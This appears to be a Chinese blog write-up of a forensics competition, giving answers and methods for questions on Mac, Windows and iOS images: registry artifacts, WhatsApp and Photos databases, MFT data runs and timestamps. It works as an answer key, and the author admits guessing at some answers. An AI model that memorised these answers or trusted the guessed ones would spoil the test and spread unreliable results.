<li><p>参考’Mac OS.img’文件回答以下题目，’Mac OS.img’档的文件系统的正确描述是什么？</p>
<p>A. HFS+（已启用日志记录）</p>
<p>B. HFS+（已启用区分大小写）</p>
<p>C. HFS+（已启用日志记录和区分大小写）</p>
<p>D. APFS（已启用区分大小写）</p>
<p>C</p>
<p>从上面的图可以看到是 HFS+，后面只能靠猜了，简单看了一下文件有大小写，而且有log文件所以选了C。</p>
<p>正真要看只有仿真起来能看到。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117101904545.png" alt="image-20231117101904545"></p>
</li>
<li><p>参考’Mac OS.img’文件回答以下题目，从文件“Car.rtfd”中删除了哪个文件？</p>
<p>yeah.jpg</p>
<p>.DocumentRevisions-V100 是 macOS 中用于支持版本控制功能的目录。这个目录包含了与文档版本控制相关的数据。版本控制允许用户在保存文档时保留历史版本，并在需要时还原到先前的版本。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117102400898.png" alt="image-20231117102400898"></p>
</li>
<li><p>参考’Mac OS.img’文件回答以下题目，请提供’Mac OS.img’映像文件被“fsck”命令检查的具体时间。</p>
<p>20230713-082435</p>
<p>fsck 命令（File System Consistency checK）是用于检查和修复文件系统中的一致性问题的工具。在 macOS（以及其他类Unix系统）中，fsck 通常在系统启动时自动运行，以确保文件系统处于良好的状态。</p>
<p>找最找的修改时间，但是题目也没说要标准时间哇。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117103544935.png" alt="image-20231117103544935"></p>
</li>
<li><p>参考’Mac OS.img’文件回答以下题目，在.dmg档中删除了多少个文件？</p>
<p>4</p>
<p>Mac os中的 .Trashes 文件相当于回收站，可以恢复被删除的文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117103827971.png" alt="image-20231117103827971"></p>
</li>
</ol>
<h2 id="Elvis-Chui计算机的镜像文件-Windows-Artifacts-e01"><a href="#Elvis-Chui计算机的镜像文件-Windows-Artifacts-e01" class="headerlink" title="Elvis Chui计算机的镜像文件 (Windows Artifacts.e01)"></a>Elvis Chui计算机的镜像文件 (Windows Artifacts.e01)</h2><ol start="32">
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，Elvis Chui 总共登入过该计算机多少次？</p>
<p>11</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117104834190.png" alt="image-20231117104834190"></p>
<p>但问题是为什么美亚取出来是10？？？什么成分我就不说了！！！</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105445894.png" alt="image-20231117105445894"></p>
</li>
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，该计算机的操作系统是在哪一个时区？</p>
<p>A. UTC +4</p>
<p>B. UTC +8</p>
<p>C. UTC -8</p>
<p>D. UTC -4</p>
<p>B</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105003831.png" alt="image-20231117105003831"></p>
</li>
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，该计算机的操作系统于何时安装？</p>
<p>A. 2023-07-13 19:18:14</p>
<p>B. 2023-07-13 11:18:14</p>
<p>C. 2023-07-13 03:18:14</p>
<p>D. 2023-07-12 19:18:14</p>
<p>B</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105035125.png" alt="image-20231117105035125"></p>
</li>
<li><p>[多选题]参考’Window Artifacts.E01’内的Windows注册表回答以下题目，哪(几)个程序会于操作系统启动时自动执行？</p>
<p>A. Avast</p>
<p>B. Steam</p>
<p>C. OneDrive</p>
<p>D. QQ</p>
<p>ABC</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105106364.png" alt="image-20231117105106364"></p>
</li>
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，该计算机内安装了以下哪一个程序？</p>
<p>A. QQ</p>
<p>B. WPS Office</p>
<p>C. Opera</p>
<p>D. Kaspersky</p>
<p>B</p>
<p>直接搜只能搜到 WPS。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105218527.png" alt="image-20231117105218527"></p>
</li>
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，计算机内的OneDrive程序版本是什么？</p>
<p>21.220.1024.0005</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105307729.png" alt="image-20231117105307729"></p>
</li>
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，计算机有一个正在连接的网络接口，该接口连接DHCP服务器的IP地址是多少？</p>
<p>192.168.88.254</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117105359870.png" alt="image-20231117105359870"></p>
</li>
<li><p>参考’Window Artifacts.E01’内的Windows注册表回答以下题目，该计算机何时连接过一只U盘？(以计算机系统时区回答)</p>
<p>A. 2023-07-13 11:48:26</p>
<p>B. 2023-07-13 03:48:29</p>
<p>C. 2023-07-12 19:48:29</p>
<p>D. 2023-07-13 11:48:29</p>
<p>D</p>
<p>通过序列号和容量都能看出序号5是真实的USD设备。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117110703649.png" alt="image-20231117110703649"></p>
</li>
<li><p>[多选题]参考’Window Artifacts.E01’回答以下题目，Elvis Chui 将哪几个文本文件放在回收站中？</p>
<p>A. $+D10I76A74P.txt</p>
<p>B. Holiday schedule 2023-07-16.txt</p>
<p>C. Holiday schedule 2023-07-13.txt</p>
<p>D. Minute on 2023-07-01.txt</p>
<p>E. Minute on 2023-07-10.txt</p>
<p>BE</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117110836331.png" alt="image-20231117110836331"></p>
</li>
<li><p>参考’Window Artifacts.E01’回答以下题目，Elvis Chui在什么时间删除了第一个文本文件？(以计算机系统时区回答)</p>
<p>A. 2023-07-13 11:50:15</p>
<p>B. 2023-07-13 03:49:45</p>
<p>C. 2023-07-13 03:50:15</p>
<p>D. 2023-07-13 11:49:45</p>
<p>D</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117111004420.png" alt="image-20231117111004420"></p>
</li>
<li><p>参考 ‘ Window Artifacts.E01 ‘回答以下题目，Elvis Chui删除的第一个文本文件的文件名是什么？</p>
<p>holiday_schedule_2023-07-16.txt</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117111004420.png" alt="image-20231117111004420"></p>
</li>
<li><p>参考’Window Artifacts.E01’回答以下题目，Elvis Chui删除的第一个文本文件在什么时间创建？(以计算机系统时区回答)</p>
<p>A. 2023-07-13_11:42:39</p>
<p>B. 2023-07-13_11:50:49</p>
<p>C. 2023-07-13_11:49:45</p>
<p>D. 2023-07-13_11:45:22</p>
<p>D</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117111238280.png" alt="image-20231117111238280"></p>
</li>
<li><p>参考’Window Artifacts.E01’回答以下题目，Elvis Chui计划于2023年7月15日20点5分有什么活动？</p>
<p>Movie</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117111325186.png" alt="image-20231117111325186"></p>
</li>
<li><p>参考’Window Artifacts.E01’回答以下题目，该计算机执行STEAM.EXE总共多少次？</p>
<p>7</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117111556340.png" alt="image-20231117111556340"></p>
</li>
</ol>
<h2 id="浩賢的iOS手机系统文件-IOS-zip"><a href="#浩賢的iOS手机系统文件-IOS-zip" class="headerlink" title="浩賢的iOS手机系统文件(IOS.zip)"></a>浩賢的iOS手机系统文件(IOS.zip)</h2><p>不是完整的手机备份，所以用火眼跑不出来，盘古石可以看出来一点应用的数据。</p>
<ol start="53">
<li><p>参考’IOS’文件夹回答以下题目，根据’com.apple.ios.StoreKitUIService.plist’，这部电话是什么型号？</p>
<p>A. SAMSUNG S23</p>
<p>B. iPhone X</p>
<p>C. iPhone XR</p>
<p>D. iPhone XS</p>
<p>E. iPhone 13</p>
<p>C</p>
<p>一个小Tips，记得去年美亚的手机是 Iphone XR 和 Iphone 6 吗，这次也大差不差。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117112454035.png" alt="image-20231117112454035"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117112517345.png" alt="image-20231117112517345"></p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据com.apple.ios.StoreKitUIService.plist，上述电话的文件系统是什么？</p>
<p>A. FAT32</p>
<p>B. NTFS</p>
<p>C. HFS+</p>
<p>D. APFS</p>
<p>E. EXT4</p>
<p>D</p>
<p>苹果公司在iOS 10.3和macOS High Sierra（10.13）中引入了APFS（Apple File System）文件系统。APFS是专为苹果生态系统设计的先进文件系统，用于替代之前使用的HFS+（Mac OS Extended）文件系统。</p>
</li>
<li><p>[多选题]参考’IOS’文件夹回答以下题目，根据ChatStorage.sqlite，哪些对话已锁定？</p>
<p>A. 447380449879@.whatsapp.net</p>
<p>B. 79096209701@.whatsapp.net</p>
<p>C. 923109725619@.whatsapp.net</p>
<p>D. 85256026169@.whatsapp.net</p>
<p>E. status@broadcast</p>
<p>ABC</p>
<p>发现只有在 ZWACHATSESSION 表中才能找到含有 status@broadcast 的记录，所以大差不差就是这个表。然后就是找标志位，发现 ZHIDDEN 这个字段比较可以，筛一下发现得到答案。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117210927237.png" alt="image-20231117210927237"></p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据ChatStorage.sqlite，有多少段录音对话？</p>
<p>45</p>
<p>在 ZWAMEDIAITEM 表中的 ZVCARDSTRING 字段有记录。</p>
<ul>
<li><code>audio/mpeg</code> 是 MPEG Audio Layer III（MP3）的 MIME 类型，表示一种常见的音频压缩格式。MP3 是一种广泛使用的音频格式，以其高度的压缩性和音质保持而闻名。MP3 通常用于音乐播放器、音乐存储、在线音乐服务等。</li>
<li><code>audio/ogg; codecs=opus</code> 是 Ogg 封装格式中使用 Opus 编码的音频文件的 MIME 类型。Ogg 是一种自由、开放的容器格式，而 Opus 则是一种高效的开放音频编解码器。Opus 常被用于实时通信应用、在线游戏语音聊天、网络音频流等，尤其适用于需要低延迟和高音质的场景。</li>
</ul>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117205412893.png" alt="image-20231117205412893"></p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，Apple Cocoa Core Data timestamp是由什么时间开始？</p>
<p>A. 2001年1月1日</p>
<p>B. 1970年1月1日</p>
<p>C. 2006年1月1日</p>
<p>D. 1960年1月1日</p>
<p>A</p>
<p>常识。在Apple的Cocoa框架中，Core Data中的timestamp通常是从2001年1月1日GMT（格林尼治标准时间）的午夜开始的。这个日期通常被称为 Core Data reference date，是Core Data中时间戳的基准日期。在Unix时间戳中，时间是从1970年1月1日GMT的午夜开始计算的。 Core Data选择了更晚的时间点作为其基准日期。</p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据Photos.sqlite数据库中，有多少段视频可能涉及WhatsApp？</p>
<p>7</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117212035146.png" alt="image-20231117212035146"></p>
</li>
<li><p>[多选题]参考’IOS’文件夹回答以下题目，根据Photos.sqlite数据库中，下列哪个选项对IMG_0008.HEIC的描述是错的？</p>
<p>A. 由第三方软件拍摄</p>
<p>B. 经过修改</p>
<p>C. 由后镜拍摄</p>
<p>D. 用ISO200拍摄</p>
<p>E. 没有储存经纬度</p>
<p>ADE（官方答案应该是错的）</p>
<p>HEIC 是苹果手机相机的原格式，所以不是由第三方软件拍摄。</p>
<p>在 ZCLOUMASTER 表中，两个日期不一样，应该是修改过否则时间应该是一样的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117212549090.png" alt="image-20231117212549090"></p>
<p>IMG_0008.HEIC 的 Z_PK 字段是 491，也是其他表中的外键，在 ZEXTENDEDATTRIBUTES 表中可以看到其他信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117213224674.png" alt="image-20231117213224674"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117213237620.png" alt="image-20231117213237620"></p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据’sms(ios).db’的资料，全局唯一标识符(GUID): DD31C26F-1D72-DE0F-431E-EF98F104402D显示的信息是什么?</p>
<p>你的 Uber 驗證碼為 3666. 請勿分享此驗證碼. </p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118081836004.png" alt="image-20231118081836004"></p>
</li>
<li><p>[多选题]参考’IOS’资料 夹回答以下题目，根据’com.burbn.instagram.plist’及’com.facebook.Facebook.plist’手机安装了实时通讯软件Facebook及Instagram的哪个版本？</p>
<p>A. Instagram (Version 278.0.0.19.115)</p>
<p>B. Facebook (Version 410.0.0.41.116)</p>
<p>C. Instagram (Version 279.0.0.23.112)</p>
<p>D. Facebook (Version 410.0.0.26.115)</p>
<p>E. Instagram (Version 278.0.0.25.115)</p>
<p>F. Facebook (Version 410.0.0.57.116)</p>
<p>AB</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118081954562.png" alt="image-20231118081954562"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118082013325.png" alt="image-20231118082013325"></p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据’ChatStorage(ios).sqlite’，用户数据Peter Chow (85262012141)在什么日期和时间(以UTC +8时区)曾经通过实时通讯软件送出一个信息(内容为: I am already home)？</p>
<p>2023-04-01_11:21:51</p>
<p>在 ZWAMESSAGE 表中的 ZTEXT 可以找到信息的内容。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118082514021.png" alt="image-20231118082514021"></p>
<p>比赛时没注意一个问题，该时间戳是从2001年1月1日起算的，这也就解释了为什么有第57题，最后还得 UTC+8。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2001-01-01 00:00:00&quot;</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"></span><br><span class="line">timestamp += <span class="number">702012111.637933</span></span><br><span class="line">time_local = time.localtime(timestamp)</span><br><span class="line">dt = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,time_local)</span><br></pre></td></tr></table></figure>
</li>
<li><p>参考’ IOS’文件夹回答以下题目，根据影片IMG_0687.MOV的原数据，找出影片拍摄时间?</p>
<p>全局搜索也没找到相关的记录。</p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据’CallHistory(ios).storedata’，哪份表格显示了通话记录？</p>
<p>A. ZCALLBPROPERTIES</p>
<p>B. ZCALLRECORD</p>
<p>C. Z_2REMOTEPARTICIPANTHANDLES</p>
<p>D. Z_METADATA</p>
<p>E. Z_MODELCACHE</p>
<p>F. Z_PRIMARYKEY</p>
<p>就看表明也能猜出来是B（RECORD）。</p>
</li>
<li><p>参考’ IOS ‘ 文件夹回答以下题目，根据’com.apple.sharingd.plist’，这部手机的隔空投送的身份标识号(AirDrop ID)是什么？</p>
<p>2abd0940fbdc</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118084222391.png" alt="image-20231118084222391"></p>
</li>
<li><p>参考’IOS’文件夹回答以下题目，根据’Accounts3.sqlite’，这部手机的苹果使用者账号 (Apple ID) 是什么？</p>
<p><a href="mailto:&#102;&#111;&#114;&#97;&#x74;&#x63;&#100;&#x32;&#x30;&#x32;&#x33;&#x40;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#109;">&#102;&#111;&#114;&#97;&#x74;&#x63;&#100;&#x32;&#x30;&#x32;&#x33;&#x40;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#109;</a></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118084722654.png" alt="image-20231118084722654"></p>
</li>
</ol>
<h2 id="浩賢的Windows-10系统虚拟机文件-Windows-10-zip"><a href="#浩賢的Windows-10系统虚拟机文件-Windows-10-zip" class="headerlink" title="浩賢的Windows 10系统虚拟机文件(Windows 10.zip)"></a>浩賢的Windows 10系统虚拟机文件(Windows 10.zip)</h2><p><strong>本题需要使用 Mft2Csv 工具分析MFT元数据并导出表格，我这里是先挂载了镜像，然后尝试用 Mft2Csv 分析，但是发现闪退。紧接着我使用 FTK 将挂在出来的系统盘做成了dd镜像，再用 Mft2Csv 分析成功拿到结果。最后搜索文件名得到想要的数据，同时导入数据到新的Excel表中，同时以竖线为分隔符分割成单元格，以便于查阅。同时注意需要转换成 UTF+8。</strong></p>
<p>对于 Mft2Csv 的结果做一个中文的翻译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RecordOffset：记录偏移</span><br><span class="line">Signature：签名</span><br><span class="line">IntegrityCheck：完整性检查</span><br><span class="line">Style：样式</span><br><span class="line">HEADER_MFTRecordNumber：MFT记录号</span><br><span class="line">HEADER_SequenceNo：序列号</span><br><span class="line">Header_HardLinkCount：硬链接计数</span><br><span class="line">FN_ParentReferenceNo：父引用号</span><br><span class="line">FN_ParentSequenceNo：父序列号</span><br><span class="line">FN_FileName：文件名</span><br><span class="line">FilePath：文件路径</span><br><span class="line">HEADER_Flags：标志</span><br><span class="line">RecordActive：记录激活</span><br><span class="line">FileSizeBytes：文件大小（字节）</span><br><span class="line">SI_FilePermission：文件权限</span><br><span class="line">FN_Flags：文件名标志</span><br><span class="line">FN_NameType：文件名类型</span><br><span class="line">ADS：备用数据流</span><br><span class="line">SI_CTime：创建时间</span><br><span class="line">SI_ATime：访问时间</span><br><span class="line">SI_MTime：修改时间</span><br><span class="line">SI_RTime：记录时间</span><br><span class="line">MSecTest：毫秒测试</span><br><span class="line">FN_CTime：文件名创建时间</span><br><span class="line">FN_ATime：文件名访问时间</span><br><span class="line">FN_MTime：文件名修改时间</span><br><span class="line">FN_RTime：文件名记录时间</span><br><span class="line">CTimeTest：创建时间测试</span><br><span class="line">FN_AllocSize：文件名分配大小</span><br><span class="line">FN_RealSize：文件名实际大小</span><br><span class="line">FN_EaSize：文件名扩展属性大小</span><br><span class="line">SI_USN：USN（更新序列号）</span><br><span class="line">DATA_Name：数据名</span><br><span class="line">DATA_Flags：数据标志</span><br><span class="line">DATA_LengthOfAttribute：属性长度</span><br><span class="line">DATA_IndexedFlag：索引标志</span><br><span class="line">DATA_VCNs：VCN（虚拟簇号）</span><br><span class="line">DATA_NonResidentFlag：非驻留标志</span><br><span class="line">DATA_CompressionUnitSize：压缩单元大小</span><br><span class="line">HEADER_LSN：LSN（日志序列号）</span><br><span class="line">HEADER_RecordRealSize：记录实际大小</span><br><span class="line">HEADER_RecordAllocSize：记录分配大小</span><br><span class="line">HEADER_BaseRecord：基础记录</span><br><span class="line">HEADER_BaseRecSeqNo：基础记录序列号</span><br><span class="line">HEADER_NextAttribID：下一个属性ID</span><br><span class="line">DATA_AllocatedSize：数据分配大小</span><br><span class="line">DATA_RealSize：数据实际大小</span><br><span class="line">DATA_InitializedStreamSize：初始化流大小</span><br><span class="line">SI_HEADER_Flags：头部标志</span><br><span class="line">SI_MaxVersions：最大版本数</span><br><span class="line">SI_VersionNumber：版本号</span><br><span class="line">SI_ClassID：类别ID</span><br><span class="line">SI_OwnerID：所有者ID</span><br><span class="line">SI_SecurityID：安全性ID</span><br><span class="line">SI_Quota：配额</span><br><span class="line">FN_CTime_2：文件名创建时间（第二部分）</span><br><span class="line">FN_ATime_2：文件名访问时间（第二部分）</span><br><span class="line">FN_MTime_2：文件名修改时间（第二部分）</span><br><span class="line">FN_RTime_2：文件名记录时间（第二部分）</span><br><span class="line">FN_AllocSize_2：文件名分配大小（第二部分）</span><br><span class="line">FN_RealSize_2：文件名实际大小（第二部分）</span><br><span class="line">FN_EaSize_2：文件名扩展属性大小（第二部分）</span><br><span class="line">FN_Flags_2：文件名标志（第二部分）</span><br><span class="line">FN_NameLength_2：文件名长度（第二部分）</span><br><span class="line">FN_NameType_2：文件名类型（第二部分）</span><br><span class="line">FN_FileName_2：文件名（第二部分）</span><br><span class="line">GUID_ObjectID：对象ID的GUID</span><br><span class="line">GUID_BirthVolumeID：出生卷的GUID</span><br><span class="line">GUID_BirthObjectID：出生对象的GUID</span><br><span class="line">GUID_DomainID：域的GUID</span><br><span class="line">VOLUME_NAME_NAME：卷名称</span><br><span class="line">VOL_INFO_NTFS_VERSION：NTFS版本</span><br><span class="line">VOL_INFO_FLAGS：卷信息标志</span><br><span class="line">FN_CTime_3：文件名创建时间（第三部分）</span><br><span class="line">FN_ATime_3：文件名访问时间（第三部分）</span><br><span class="line">FN_MTime_3：文件名修改时间（第三部分）</span><br><span class="line">FN_RTime_3：文件名记录时间（第三部分）</span><br><span class="line">FN_AllocSize_3：文件名分配大小（第三部分）</span><br><span class="line">FN_RealSize_3：文件名实际大小（第三部分）</span><br><span class="line">FN_EaSize_3：文件名扩展属性大小（第三部分）</span><br><span class="line">FN_Flags_3：文件名标志（第三部分）</span><br><span class="line">FN_NameLength_3：文件名长度（第三部分）</span><br><span class="line">FN_NameType_3：文件名类型（第三部分）</span><br><span class="line">FN_FileName_3：文件名（第三部分）</span><br><span class="line">DATA_Name_2：数据名（第二部分）</span><br><span class="line">DATA_NonResidentFlag_2：非驻留标志（第二部分）</span><br><span class="line">DATA_Flags_2：数据标志（第二部分）</span><br><span class="line">DATA_LengthOfAttribute_2：属性长度（第二部分）</span><br><span class="line">DATA_IndexedFlag_2：索引标志（第二部分）</span><br><span class="line">DATA_StartVCN_2：起始VCN（第二部分）</span><br><span class="line">DATA_LastVCN_2：最后VCN（第二部分）</span><br><span class="line">DATA_VCNs_2：VCN（虚拟簇号，第二部分）</span><br><span class="line">DATA_CompressionUnitSize_2：压缩单元大小（第二部分）</span><br><span class="line">DATA_AllocatedSize_2：数据分配大小（第二部分）</span><br><span class="line">DATA_RealSize_2：数据实际大小（第二部分）</span><br><span class="line">DATA_InitializedStreamSize_2：初始化流大小（第二部分）</span><br><span class="line">DATA_Name_3：数据名（第三部分）</span><br><span class="line">DATA_NonResidentFlag_3：非驻留标志（第三部分）</span><br><span class="line">DATA_Flags_3：数据标志（第三部分）</span><br><span class="line">DATA_LengthOfAttribute_3：属性长度（第三部分）</span><br><span class="line">DATA_IndexedFlag_3：索引标志（第三部分）</span><br><span class="line">DATA_StartVCN_3：起始VCN（第三部分）</span><br><span class="line">DATA_LastVCN_3：最后VCN（第三部分）</span><br><span class="line">DATA_VCNs_3：VCN（虚拟簇号，第三部分）</span><br><span class="line">DATA_CompressionUnitSize_3：压缩单元大小（第三部分）</span><br><span class="line">DATA_AllocatedSize_3：数据分配大小（第三部分）</span><br><span class="line">DATA_RealSize_3：数据实际大小（第三部分）</span><br><span class="line">DATA_InitializedStreamSize_3：初始化流大小（第三部分）</span><br><span class="line">STANDARD_INFORMATION_ON：标准信息是否存在</span><br><span class="line">ATTRIBUTE_LIST_ON：属性列表是否存在</span><br><span class="line">FILE_NAME_ON：文件名是否存在</span><br><span class="line">OBJECT_ID_ON：对象ID是否存在</span><br><span class="line">SECURITY_DESCRIPTOR_ON：安全描述符是否存在</span><br><span class="line">VOLUME_NAME_ON：卷名称是否存在</span><br><span class="line">VOLUME_INFORMATION_ON：卷信息是否存在</span><br><span class="line">DATA_ON：数据是否存在</span><br><span class="line">INDEX_ROOT_ON：索引根是否存在</span><br><span class="line">INDEX_ALLOCATION_ON：索引分配是否存在</span><br><span class="line">BITMAP_ON：位图是否存在</span><br><span class="line">REPARSE_POINT_ON：重新解释点是否存在</span><br><span class="line">EA_INFORMATION_ON：扩展属性信息是否存在</span><br><span class="line">EA_ON：扩展属性是否存在</span><br><span class="line">PROPERTY_SET_ON：属性集是否存在</span><br><span class="line">LOGGED_UTILITY_STREAM_ON：记录的实用流是否存在</span><br><span class="line">DT_DataRun：数据运行</span><br></pre></td></tr></table></figure>

<ol start="88">
<li><p>参考’Windows 10’文件夹回答以下题目，在Windows 10中\Users\qqqqq\Downloads，视频文件(mixkit-two-women-laying-together-925-medium.mp4)，在MFT 中分成多少个Data Cluster储存？</p>
<p>5</p>
<p>Data Cluster（数据簇）是文件系统中存储数据的基本单位。文件系统将文件的实际数据存储在数据簇中，而元数据（例如文件名、权限、时间戳等）存储在MFT中的记录项中。</p>
<p>从 Mft2Csv 中我们可以找到该文件的MFT表偏移在0x00000000C689AC00字节处，Winhex里看一下。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118150117004.png" alt="image-20231118150117004"></p>
<p>对照 0x80 属性的非常驻表：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118145919276.png" alt="image-20231118145919276"></p>
<p>在簇流列表里我们可以找到5项，分别为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32 80 00 F5 DD 25</span><br><span class="line">32 2A 01 0C 74 EB</span><br><span class="line">31 77 84 8C 12</span><br><span class="line">32 70 02 79 DE DA</span><br><span class="line">32 AA 01 48 A2 10</span><br></pre></td></tr></table></figure>
</li>
<li><p>参考’ Windows 10 ‘ 文件夹回答以下题目，在Windows 10中\Users\qqqqq\Downloads\mixkit-two-woman-laying-together-925-medium.mp4的last Access时间是多少？</p>
<p>A. 2023&#x2F;07&#x2F;10 18:31:32</p>
<p>B. 2023&#x2F;07&#x2F;10 18:31:01</p>
<p>C. 2023&#x2F;07&#x2F;10 19:31:22</p>
<p>D. 2023&#x2F;07&#x2F;11 19:31:22</p>
<p>A</p>
<p>应该是最后记录的时间。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118142308378.png" alt="image-20231118142308378"></p>
</li>
</ol>
<h2 id="Elvis-Chui的Windows7虚拟机文件-Windows7-zip"><a href="#Elvis-Chui的Windows7虚拟机文件-Windows7-zip" class="headerlink" title="Elvis Chui的Windows7虚拟机文件(Windows7.zip)"></a>Elvis Chui的Windows7虚拟机文件(Windows7.zip)</h2><ol start="90">
<li><p>参考’Windows 7’文件夹回答以下题目，在Windows 7中\Users\Allen\Desktop，有1个MP3文件(例:unlock-me-149058.mp3)，用户使用什么程序打开该MP3文件? </p>
<p>potplayer</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118134110027.png" alt="image-20231118134110027"></p>
</li>
<li><p>参考’Windows 7’文件夹回答以下题目，在Windows 7中’\Users\Allen\Desktop ‘有1个MP3文件(unlock-me-149058.mp3)，该文件的Zone identiflier为’3’。上述’3’字代表哪一个security Zone ?</p>
<p>A. Local Machine Zone</p>
<p>B. Internet Zone</p>
<p>C. Restricted Zone</p>
<p>D. Trust Site Zone</p>
<p>B</p>
<p>Zone Identifier是Windows操作系统中一个安全特性，用于标识文件是否从不受信任的来源下载或拷贝到本地磁盘上。Zone Identifier有五个级别，分别为：</p>
<ul>
<li>ZoneId&#x3D;0：本地计算机，Local Machine Zone</li>
<li>ZoneId&#x3D;1：本地局域网，Local Internet Zone</li>
<li>ZoneId&#x3D;2：受信任的站点，Trusted Sites Zone</li>
<li>ZoneId&#x3D;3：互联网，Internet Zone</li>
<li>ZoneId&#x3D;4：受限制的站点，Restricted Sites Zone</li>
</ul>
</li>
<li><p>参考’Windows 7’文件夹回答以下题目，在 Windows 7中\Users\Allen\Desktop有1个MP3文件 (unlock-me-149058.mp3)，该文件从哪个网站下载？</p>
<p>A. <a href="http://www.pixbay.com/">www.Pixbay.com</a></p>
<p>B. free-mp3-download.net&#x2F;</p>
<p>C. <a href="https://mp3juices.nu/">https://mp3juices.nu</a></p>
<p>D. mygomp3.com</p>
<p>A</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118134042160.png" alt="image-20231118134042160"></p>
</li>
<li><p>参考’Windows 7’文件夹回答以下题目，在 Windows 7中\Users\Allen\Downloads内有mp3文件(miracle.mp3)，更改名称时间？</p>
<p>A. 2023-07-13 02:55:20</p>
<p>B. 2023-07-15 10:55:20</p>
<p>C. 2023-07-12 10:58:04</p>
<p>D. 2023-07-13 10:55:20</p>
<p>D</p>
<p>需要去日志里面找，可笑的是，取证大师的找不到但是火眼能够在NTFS日志分析里找到。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118142343106.png" alt="image-20231118142343106"></p>
</li>
<li><p>参考’Windows 7’文件夹回答以下题目，在Windows 7中\Users\Allen\Downloads内有mp3文件(miracle.mp3)，mp3文件更改名称前的名称是什么？</p>
<p>a-small-miracle-132333.mp3</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231118142343106.png"></p>
</li>
<li><p>参考’Windows 7’文件夹回答以下题目，在Windows 7中有多少个文件曾被potplayer播放？</p>
<p>A. 7</p>
<p>B. 8</p>
<p>C. 9</p>
<p>D. 10</p>
